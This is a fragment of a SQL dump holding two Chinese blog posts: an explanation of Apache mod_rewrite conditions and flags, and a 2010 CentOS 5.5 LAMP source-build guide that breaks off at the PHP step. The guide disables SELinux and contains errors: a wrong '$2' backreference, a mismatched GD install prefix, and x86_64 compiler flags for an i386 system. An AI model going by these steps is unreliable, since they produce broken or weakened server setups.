的意思就是请求的地址不是 /favicon.ico 才触发下面的地址重写；&lt;/p&gt;\r\n&lt;p&gt;! (惊叹号)来指定不匹配。&lt;br /&gt;\r\n''-d''(目录)&amp;nbsp; 将TestString视为一个路径名并测试它是否为一个存在的目录。&lt;br /&gt;\r\n''-f''(常规文件)&amp;nbsp; 将TestString视为一个路径名并测试它是否为一个存在的常规文件。&lt;/p&gt;\r\n&lt;p&gt;所以： RewriteCond %{REQUEST_FILENAME} !-f&amp;nbsp; 的意思为， 请求的文件并不存在时触发后面的地址重写；&lt;/p&gt;\r\n&lt;p&gt;RewriteCond %{REQUEST_FILENAME} !-d&amp;nbsp; 的意思为： 请求的目录并不存在时，触发后面的地址重写；&lt;/p&gt;\r\n&lt;p&gt;更多这个参数的写法可以参看： &lt;a title=&quot;http://www.52web.com/52article/?view-258.html&quot; href=&quot;http://www.52web.com/52article/?view-258.html&quot;&gt;http://www.52web.com/52article/?view-258.html&lt;/a&gt;&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;[flags] &lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;我们还可以在CondPattern之后追加特殊的标记[flags]作为RewriteCond指令的第三个参数。flags是一个以逗号分隔的以下标记的列表： &lt;/p&gt;\r\n&lt;p&gt;''nocase|NC''(忽略大小写)&lt;br /&gt;\r\n它使测试忽略大小写，扩展后的TestString和CondPattern中''A-Z'' 和''a-z''是没有区别的。此标记仅用于TestString和CondPattern的比较，而对文件系统和子请求的检查不起作用。&lt;br /&gt;\r\n''ornext|OR''(或下一条件)&lt;br /&gt;\r\n它以OR方式组合若干规则的条件，而不是隐含的AND。典型的例子如下： &lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp; &lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;RewriteRule &lt;/strong&gt;具体的重写策略：&lt;/p&gt;\r\n&lt;p&gt;RewriteRule的语法如后：&amp;nbsp; RewriteRule Pattern Substitution [flags]&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;Pattern &lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;对Apache1.2及以后的版本，模板(Pattern)是一个POSIX正则式，用以匹配当前的URL。当前的URL不一定是最初提交的URL，因为可能用一些规则在此规则前已经对URL进行了处理。&lt;/p&gt;\r\n&lt;p&gt;这里是 ^(.*)$ ，意味着一行任何的地址请求；&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;Substitution &lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;当匹配成功后，Substitution会被用来替换相应的匹配。&lt;/p&gt;\r\n&lt;p&gt;这里的 RewriteRule ^(.*)$ index.php?q=$1&amp;nbsp; 意味着， 如果原先请求的是 /aaa/ddd&amp;nbsp; 重写后地址变成 index.php?q=/aaa/ddd ;&lt;/p&gt;\r\n&lt;p&gt;它除了可以是普通的字符串以外，还可以包括： &lt;br /&gt;\r\n1. $N,引用RewriteRule模板中匹配的相关字串，N表示序号,N=0..9 &lt;br /&gt;\r\n2. %N,引用最后一个RewriteCond模板中匹配的数据，N表示序号 &lt;br /&gt;\r\n3. %{VARNAME},服务器变量 &lt;br /&gt;\r\n4. ${mapname:key|default},映射函数调用。&lt;/p&gt;\r\n&lt;p&gt;更多信息可以参看：&lt;a title=&quot;http://www.ixdba.net/article/ae/1443.html&quot; href=&quot;http://www.ixdba.net/article/ae/1443.html&quot;&gt;http://www.ixdba.net/article/ae/1443.html&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;[flags]&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p&gt;作为RewriteRule指令的第三个参数。 Flags是一个包含以逗号分隔的标记的列表。&lt;/p&gt;\r\n&lt;p&gt;这里的 L，QSA 分别是如下意思：&lt;/p&gt;\r\n&lt;p&gt;''last|L'' (最后一个规则 last)&lt;br /&gt;\r\n立即停止重写操作，并不再应用其他重写规则。 它对应于Perl中的last命令或C语言中的break命令。 这个标记可以阻止当前已被重写的URL为其后继的规则所重写。 举例，使用它可以重写根路径的URL(''/'')为实际存在的URL, 比如, ''/e/www/''. &lt;/p&gt;\r\n&lt;p&gt;''qsappend|QSA'' (追加请求串 query string append)&lt;br /&gt;\r\n此标记强制重写引擎在已有的替换串中追加一个请求串，而不是简单的替换。 如果需要通过重写规则在请求串中增加信息，就可以使用这个标记。 &lt;/p&gt;\r\n&lt;p&gt;比如说我要把 /user/ghj1976 重定向到/user.php?uid=ghj1976 那么我的规则就须这样：&lt;br /&gt;\r\nRewriteRule ^user/([^/]+)$ ^/user.php?uid=$2 [L]&lt;/p&gt;\r\n&lt;p&gt;但是如果我们希望 /user/ghj1976?key=java&amp;nbsp; 重定向到&amp;nbsp; /user.php?uid=ghj1976&amp;amp;key=java&lt;/p&gt;\r\n&lt;p&gt;写成 RewriteRule ^user/([^/]+)$ ^/user.php?uid=$2 [QSA,L]&amp;nbsp; 这样增加个 QSA 就可以了。&lt;/p&gt;\r\n&lt;p&gt;如果没有QSA，就会丢掉我们额外传的这个参数key=java。&lt;/p&gt;\r\n', 1, 1, 0, 0, 1305093863, 1, 'admin'),
(109, 1, 'Centos5.5下安装LAMP完整版', '', '', '&lt;div&gt;Centos5.5(32bit)&lt;br /&gt;\r\nAuthor:hx10&lt;br /&gt;\r\nDate: 2010/7/25&amp;nbsp; hangzhou&lt;br /&gt;\r\nBlog :http://hi.baidu.com/hx10&lt;/div&gt;\r\n&lt;div&gt;下载软件包(截至2010/7/25软件为最新稳定版本)&lt;br /&gt;\r\n&lt;a href=&quot;http://www.libgd.org/releases/gd-2.0.35.tar.gz&quot;&gt;http://www.libgd.org/releases/gd-2.0.35.tar.gz&lt;/a&gt;&lt;br /&gt;\r\n&lt;a href=&quot;ftp://xmlsoft.org/libxml2/libxml2-2.7.7.tar.gz&quot;&gt;ftp://xmlsoft.org/libxml2/libxml2-2.7.7.tar.gz&lt;/a&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://ftp.devil-linux.org/pub/devel/sources/1.2/libmcrypt-2.5.8.tar.bz2&quot;&gt;http://ftp.devil-linux.org/pub/devel/sources/1.2/libmcrypt-2.5.8.tar.bz2&lt;/a&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://cronolog.org/download/cronolog-1.6.2.tar.gz&quot;&gt;http://cronolog.org/download/cronolog-1.6.2.tar.gz&lt;/a&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://labs.renren.com/apache-mirror/httpd/httpd-2.2.15.tar.gz&quot;&gt;http://labs.renren.com/apache-mirror/httpd/httpd-2.2.15.tar.gz&lt;/a&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://gd.tuwien.ac.at/db/mysql/Downloads/MySQL-5.1/mysql-5.1.49.tar.gz&quot;&gt;http://gd.tuwien.ac.at/db/mysql/Downloads/MySQL-5.1/mysql-5.1.49.tar.gz&lt;/a&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://cn.php.net/distributions/php-5.2.14.tar.gz&quot;&gt;http://cn.php.net/distributions/php-5.2.14.tar.gz&lt;/a&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://xcache.lighttpd.net/pub/Releases/1.3.0/xcache-1.3.0.tar.gz&quot;&gt;http://xcache.lighttpd.net/pub/Releases/1.3.0/xcache-1.3.0.tar.gz&lt;/a&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://downloads.zend.com/optimizer/3.3.9/ZendOptimizer-3.3.9-linux-glibc23-i386.tar.gz&quot;&gt;http://downloads.zend.com/optimizer/3.3.9/ZendOptimizer-3.3.9-linux-glibc23-i386.tar.gz&lt;/a&gt;&lt;/div&gt;\r\n&lt;div&gt;保存为down.txt&lt;br /&gt;\r\n# cd /usr/local/src&lt;br /&gt;\r\n# wget -i down.txt&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\ncd /usr/local/src&lt;br /&gt;\r\nvim init.sh&lt;/div&gt;\r\n&lt;div&gt;&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;&amp;nbsp;&lt;/div&gt;\r\n#!/bin/bash&lt;br /&gt;\r\n#disable ipv6&lt;br /&gt;\r\necho &quot;alias net-pf-10 off&quot; &amp;gt;&amp;gt; /etc/modprobe.conf&lt;br /&gt;\r\necho &quot;alias ipv6 off&quot; &amp;gt;&amp;gt; /etc/modprobe.conf&lt;br /&gt;\r\n/sbin/chkconfig --level 35 ip6tables off&lt;br /&gt;\r\necho &quot;ipv6 is disabled!&quot;&lt;br /&gt;\r\n#disable selinux&lt;br /&gt;\r\nsed -i ''/SELINUX/s/enforcing/disabled/'' /etc/selinux/config &lt;br /&gt;\r\necho &quot;selinux is disabled,you must reboot!&quot;&lt;br /&gt;\r\n#vim&lt;br /&gt;\r\nsed -i &quot;8 s/^/alias vi=''vim''/&quot; /root/.bashrc&lt;br /&gt;\r\necho ''syntax on'' &amp;gt; /root/.vimrc&lt;br /&gt;\r\n#zh_cn&lt;br /&gt;\r\nsed -i -e ''s/^LANG=.*/LANG=&quot;zh_CN.GB18030&quot;/''&amp;nbsp;&amp;nbsp; /etc/sysconfig/i18n&lt;br /&gt;\r\n#tunoff services&lt;br /&gt;\r\nfor i in `ls /etc/rc3.d/S*`&lt;br /&gt;\r\ndo&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; CURSRV=`echo $i|cut -c 15-`&lt;/div&gt;\r\n&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;echo $CURSRV&lt;br /&gt;\r\ncase $CURSRV in&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; crond | irqbalance | microcode_ctl | network | random | sendmail | sshd | syslog | local | mysqld | httpd )&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; echo &quot;Base services, Skip!&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; *)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; echo &quot;change $CURSRV to off&quot;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; chkconfig --level 235 $CURSRV off&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; service $CURSRV stop&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;;&lt;br /&gt;\r\nesac&lt;br /&gt;\r\ndone&lt;/div&gt;\r\n# sh init.sh&lt;br /&gt;\r\n# reboot&lt;/div&gt;\r\n&lt;div&gt;二、编译安装基本环境&lt;br /&gt;\r\n1. 安装准备&lt;br /&gt;\r\n1) 系统约定&lt;br /&gt;\r\n操作系统：Centos5.5 i386&lt;br /&gt;\r\nIP:192.168.1.103&lt;br /&gt;\r\n软件源代码包存放位置&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; /usr/local/src&lt;br /&gt;\r\n源码包编译安装位置(prefix)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; /usr/local/software_name&lt;br /&gt;\r\n脚本以及维护程序存放位置&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; /usr/local/sbin&lt;br /&gt;\r\nMySQL 数据库位置&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; /data/mysql/data（可按情况设置）&lt;br /&gt;\r\nApache 网站根目录&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; /data/www/wwwroot（可按情况设置）&lt;br /&gt;\r\nApache 虚拟主机日志根目录&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; /data/www/logs（可按情况设置）&lt;br /&gt;\r\nApache 运行账户&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; www:www&amp;nbsp; &lt;br /&gt;\r\nuseradd -d /data/www/&lt;br /&gt;\r\nchown &lt;a href=&quot;http://www.www/&quot;&gt;www.www&lt;/a&gt; /data/www/wwwroot&lt;/div&gt;\r\n&lt;div&gt;2) 系统环境部署及调整&lt;br /&gt;\r\n&amp;nbsp;检查系统是否正常&lt;br /&gt;\r\n# tail -n100 /var/log/messages&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; （检查有无系统级错误信息）&lt;br /&gt;\r\n# dmesg （检查硬件设备是否有错误信息）&lt;br /&gt;\r\n# ifconfig（检查网卡设置是否正确）&lt;br /&gt;\r\n# ping &lt;a href=&quot;http://www.baidu.com/&quot;&gt;www.baidu.com&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; （检查网络是否正常）&lt;/div&gt;\r\n&lt;div&gt;3) 使用 yum 程序安装所需开发包（以下为标准的 RPM 包名称）&lt;br /&gt;\r\n#rpm --import&amp;nbsp; &lt;a href=&quot;http://mirror.centos.org/centos/RPM-GPG-KEY-CentOS-5&quot;&gt;http://mirror.centos.org/centos/RPM-GPG-KEY-CentOS-5&lt;/a&gt;&lt;br /&gt;\r\n#&lt;br /&gt;\r\n&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;yum -y install ntp vim-enhanced gcc gcc-c++ gcc-g77 flex bison autoconf automake bzip2-devel \\&lt;br /&gt;\r\nncurses-devel zlib-devel libjpeg-devel libpng-devel libtiff-devel freetype-devel libXpm-devel \\&lt;br /&gt;\r\ngettext-devel&amp;nbsp; pam-devel libtool libtool-ltdl openssl openssl-devel fontconfig-devel&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;解释如下：&lt;br /&gt;\r\n安装基本的编译工具&amp;nbsp; # yum install -y gcc gcc-c++ flex bison autoconf automake libtool bzip2-devel zlib-devel ncurses-devel pam-devel&lt;br /&gt;\r\n安装编译 GD 需要的库# yum install -y xorg-x11-server-Xorg fontconfig-devel libXpm-devel libjpeg-devel libpng-devel libtiff-devel freetype-devel&lt;br /&gt;\r\n安装mysql需要的库# yum install -y libxml2-devel curl-devel&lt;br /&gt;\r\n4) 定时校正服务器时钟，定时与中国国家授时中心授时服务器同步&lt;br /&gt;\r\n# crontab -e&lt;br /&gt;\r\n加入一行：&lt;br /&gt;\r\n30 * * * * /usr/sbin/ntpdate 210.72.145.44 &amp;gt; /dev/null 2&amp;gt;&amp;amp;1&lt;br /&gt;\r\nservice crond restart&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n2. 编译安装软件包&lt;/div&gt;\r\n&lt;div&gt;1)GD2&lt;br /&gt;\r\ncd /usr/local/src&lt;br /&gt;\r\ntar -zxvf gd-2.0.35.tar.gz&lt;br /&gt;\r\ncd gd-2.0.35&lt;br /&gt;\r\n./configure --prefix=/usr/local/libxml2&lt;br /&gt;\r\nmake &amp;amp;&amp;amp; make install&lt;/div&gt;\r\n&lt;div&gt;2) LibXML2&lt;br /&gt;\r\ntar -zxvf libxml2-2.7.7.tar.gz&lt;br /&gt;\r\ncd libxml2-2.7.7&lt;br /&gt;\r\n./configure --prefix=/usr/local/libxml2&lt;br /&gt;\r\nmake &amp;amp;&amp;amp; make install&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;3) LibMcrypt&lt;br /&gt;\r\ntar xvf libmcrypt-2.5.8.tar.bz2&lt;br /&gt;\r\ncd libmcrypt-2.5.8&lt;br /&gt;\r\n./configure --prefix=/usr/local/libmcrypt&lt;br /&gt;\r\nmake &amp;amp;&amp;amp; make install&lt;/div&gt;\r\n&lt;div&gt;4) Apache日志截断程序&lt;br /&gt;\r\ntar zxvf cronolog-1.6.2.tar.gz&lt;br /&gt;\r\ncd cronolog-1.6.2&lt;br /&gt;\r\n./configure --prefix=/usr/local/cronolog&lt;br /&gt;\r\nmake &amp;amp;&amp;amp; make install&lt;/div&gt;\r\n&lt;div&gt;这几步可以放到脚本里面安装&lt;br /&gt;\r\nvim install_1.sh&lt;/div&gt;\r\n&lt;div&gt;&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;&lt;div&gt;cd /usr/local/src&lt;br /&gt;\r\ntar -zxvf gd-2.0.35.tar.gz&lt;br /&gt;\r\ncd gd-2.0.35&lt;br /&gt;\r\n./configure --prefix=/usr/local/gd2&lt;br /&gt;\r\nmake &amp;amp;&amp;amp; make install&lt;br /&gt;\r\ncd ..&lt;br /&gt;\r\ntar -zxvf libxml2-2.7.7.tar.gz&lt;br /&gt;\r\ncd libxml2-2.7.7&lt;br /&gt;\r\n./configure --prefix=/usr/local/libxml2&lt;br /&gt;\r\nmake &amp;amp;&amp;amp; make install&lt;br /&gt;\r\ncd ..&lt;br /&gt;\r\ntar xvf libmcrypt-2.5.8.tar.bz2&lt;br /&gt;\r\ncd libmcrypt-2.5.8&lt;br /&gt;\r\n./configure --prefix=/usr/local/libmcrypt&lt;br /&gt;\r\nmake &amp;amp;&amp;amp; make install&lt;br /&gt;\r\ncd ..&lt;br /&gt;\r\ntar zxvf cronolog-1.6.2.tar.gz&lt;br /&gt;\r\ncd cronolog-1.6.2&lt;br /&gt;\r\n./configure --prefix=/usr/local/cronolog&lt;br /&gt;\r\nmake &amp;amp;&amp;amp; make install&lt;br /&gt;\r\ncd..&lt;br /&gt;\r\nexit&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n# sh install_1.sh&lt;/div&gt;\r\n&lt;div&gt;5) 安装mysql&lt;br /&gt;\r\n查看分析你的CPU型号&lt;br /&gt;\r\n&lt;a href=&quot;http://en.gentoo-wiki.com/wiki/Safe_Cflags&quot;&gt;http://en.gentoo-wiki.com/wiki/Safe_Cflags&lt;/a&gt;&lt;br /&gt;\r\n查找您的GCC编译参数&lt;br /&gt;\r\n确定系统CPU类型&lt;br /&gt;\r\n# cat /proc/cpuinfo | grep &quot;model name&quot;&lt;br /&gt;\r\nmodel name&amp;nbsp;: Intel(R) Core(TM)2 Duo CPU&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; T6570&amp;nbsp; @ 2.10GHz&lt;br /&gt;\r\n执行后会看到系统中CPU的具体型号，记下CPU型号。&lt;br /&gt;\r\n查到CPU的参数为&lt;br /&gt;\r\n64 bit profile (amd64) for &amp;lt; GCC 4.3&lt;/div&gt;\r\n&lt;div&gt;&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;CHOST=&quot;x86_64-pc-linux-gnu&quot;&lt;br /&gt;\r\nCFLAGS=&quot;-march=nocona -O2 -pipe&quot;&lt;br /&gt;\r\nCXXFLAGS=&quot;${CFLAGS}&quot;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;tar -zxvf &lt;span style=&quot;text-decoration:underline;&quot;&gt;&lt;span style=&quot;color:#810081;&quot;&gt;mysql-5.1.49.tar.gz&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;\r\n&lt;div&gt;cd mysql-5.1.49&lt;br /&gt;\r\n修改mysql的最大连接数，默认是100&lt;br /&gt;\r\nvim sql/mysqld.cc&lt;br /&gt;\r\n搜索max_connections,找到REQUIRED_ARG后面的100，改成1500，当然小点也可以，根据你的需要来，不建议改的太大，然后保存&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\nvim install_mysql.sh&lt;/div&gt;\r\n&lt;div&gt;&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;&lt;div&gt;CHOST=&quot;x86_64-pc-linux-gnu&quot;&lt;br /&gt;\r\nCFLAGS=&quot;-march=nocona -O2 -pipe&quot;&lt;br /&gt;\r\nCXXFLAGS=&quot;${CFLAGS}&quot;&lt;br /&gt;\r\n./configure \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--prefix=/usr/local/mysql&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--localstatedir=/data/mysql/data&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-comment=Source&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-server-suffix=-hx10&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-mysqld-user=mysql&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--without-debug&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-big-tables&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-charset=gbk&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-collation=gbk_chinese_ci&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-extra-charsets=all&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-pthread&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--enable-static&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--enable-thread-safe-client&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-client-ldflags=-all-static&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-mysqld-ldflags=-all-static&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--enable-assembler&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--without-isam&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--without-innodb&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--without-ndb-debug&quot;&lt;br /&gt;\r\nmake &amp;amp;&amp;amp; make install&lt;br /&gt;\r\nmkdir -p /data/mysql/data&lt;br /&gt;\r\nuseradd mysql -d /data/mysql -s /sbin/nologin&lt;br /&gt;\r\n/usr/local/mysql/bin/mysql_install_db --user=mysql&lt;br /&gt;\r\ncd /usr/local/mysql&lt;br /&gt;\r\nchown -R root:mysql .&lt;br /&gt;\r\nchown -R mysql /data/mysql/data&lt;br /&gt;\r\ncp share/mysql/my-huge.cnf /etc/my.cnf&lt;br /&gt;\r\ncp share/mysql/mysql.server /etc/rc.d/init.d/mysqld&lt;br /&gt;\r\nchmod 755 /etc/rc.d/init.d/mysqld&lt;br /&gt;\r\nchkconfig --add mysqld&lt;br /&gt;\r\n/etc/rc.d/init.d/mysqld start&amp;nbsp; &lt;br /&gt;\r\ncd /usr/local/mysql/bin&lt;br /&gt;\r\nfor i in *; do ln -s /usr/local/mysql/bin/$i /usr/bin/$i; done&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n然后执行脚本 sh install_mysql.sh&lt;/div&gt;\r\n&lt;div&gt;# mysql -u root -p&lt;br /&gt;\r\nmysql&amp;gt; select version();&lt;br /&gt;\r\n+----------------------+&lt;br /&gt;\r\n| version()&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; |&lt;br /&gt;\r\n+----------------------+&lt;br /&gt;\r\n| 5.1.49-hx10-log | &lt;br /&gt;\r\n+----------------------+&lt;br /&gt;\r\n1 row in set (0.00 sec)&lt;/div&gt;\r\n&lt;div&gt;mysql&amp;gt;&lt;/div&gt;\r\n&lt;div&gt;6)安装apache&lt;br /&gt;\r\ngroupadd httpd&lt;br /&gt;\r\nuseradd -g httpd -s /sbin/nologin -M httpd&lt;/div&gt;\r\n&lt;div&gt;tar -zxvf httpd-2.2.15.tar.gz&lt;br /&gt;\r\ncd httpd-2.2.15&lt;br /&gt;\r\nvim install_httpd.sh&lt;/div&gt;\r\n&lt;div&gt;&lt;div style=&quot;border:1px solid #aaaaaa;padding:5px;background-color:#d3d3d3;&quot;&gt;&lt;div&gt;&lt;div&gt;./configure \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--prefix=/usr/local/apache2&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--with-included-apr&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--enable-so&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--enable-deflate=shared&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--enable-expires=shared&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--enable-rewrite=shared&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--enable-static-support&quot; \\&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &quot;--disable-userdir&quot;&lt;br /&gt;\r\nmake&lt;br /&gt;\r\nmake install&lt;br /&gt;\r\ncd ..&lt;br /&gt;\r\nexit&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n# sh install_httpd.sh&lt;/div&gt;\r\n&lt;div&gt;7)安装php&lt;br /&gt;\r\ntar -zxvf php-5.2.14.tar.gz&lt;br /&gt;\r\ncd&amp;nbsp; php-5.2.14&lt;br /&gt;\r\nvim install_php.sh&lt;/div&gt;\r\n&lt;div&gt;&lt;div style=&quot;border:1px solid 